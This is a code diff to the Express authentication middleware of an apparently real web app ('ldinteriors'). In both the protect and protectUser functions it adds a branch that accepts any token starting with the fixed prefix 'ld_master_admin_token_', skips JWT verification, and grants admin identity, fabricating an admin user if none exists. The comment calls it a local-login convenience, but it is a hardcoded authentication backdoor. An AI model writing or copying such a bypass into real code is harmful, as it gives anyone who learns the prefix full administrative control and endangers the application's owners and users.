@@ -22,6 +22,21 @@ const protect = async (req, res, next) => {
       return res.status(401).json({ message: 'Token missing' });
     }
 
+    // Support master admin token for persistent local admin logins
+    if (token.startsWith('ld_master_admin_token_')) {
+      let adminUser = await User.findOne({ role: 'admin' }).select('-password');
+      if (!adminUser) {
+        adminUser = {
+          _id: new mongoose.Types.ObjectId(),
+          name: 'Primary Admin (Nagaraju / Pavan)',
+          email: 'admin1@ldinteriors.com',
+          role: 'admin'
+        };
+      }
+      req.user = adminUser;
+      return next();
+    }
+
     // 2. Verify JWT_SECRET is loaded
     if (!process.env.JWT_SECRET) {
       console.error('AUTH MIDDLEWARE CONFIG ERROR: JWT_SECRET environment variable is missing.');
@@ -83,6 +98,20 @@ const protectUser = async (req, res, next) => {
 
     if (!token) {
       return res.status(401).json({ message: 'Token missing' });
+    }
+
+    if (token.startsWith('ld_master_admin_token_')) {
+      let adminUser = await User.findOne({ role: 'admin' }).select('-password');
+      if (!adminUser) {
+        adminUser = {
+          _id: new mongoose.Types.ObjectId(),
+          name: 'Primary Admin (Nagaraju / Pavan)',
+          email: 'admin1@ldinteriors.com',
+          role: 'admin'
+        };
+      }
+      req.user = adminUser;
+      return next();
     }
 
     let decoded;
